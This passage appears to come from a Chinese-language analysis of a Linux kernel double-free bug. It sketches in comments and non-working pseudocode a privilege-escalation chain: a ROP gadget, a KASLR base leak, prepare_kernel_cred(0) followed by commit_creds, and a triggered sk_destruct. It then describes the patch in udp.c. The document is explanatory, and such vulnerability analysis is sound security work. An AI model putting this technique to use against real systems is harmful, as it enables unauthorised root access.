// gadget: pop rdi; jmp [rax]  (rax指向下一个gadget地址)
// 需要设置rdi=0，然后跳转到prepare_kernel_cred
// 再调用commit_creds

// 内核地址空间布局随机化（KASLR）需要先泄漏内核基址
// 通过侧信道或信息泄露漏洞获取

// 伪代码（非实际运行）
unsigned long *gadget_table = kmalloc(0x1000, GFP_KERNEL);
gadget_table[0] = (unsigned long)prepare_kernel_cred; // 函数地址
gadget_table[1] = (unsigned long)commit_creds;

// 设置rax指向gadget_table
// 触发sk_destruct调用


修复：Linux内核4.13.2及更高版本通过增加引用计数检查并修复释放逻辑来修补此漏洞。具体补丁在net/ipv4/udp.c中增加了对sk->sk_rmem_alloc的原子操作，防止重复释放。

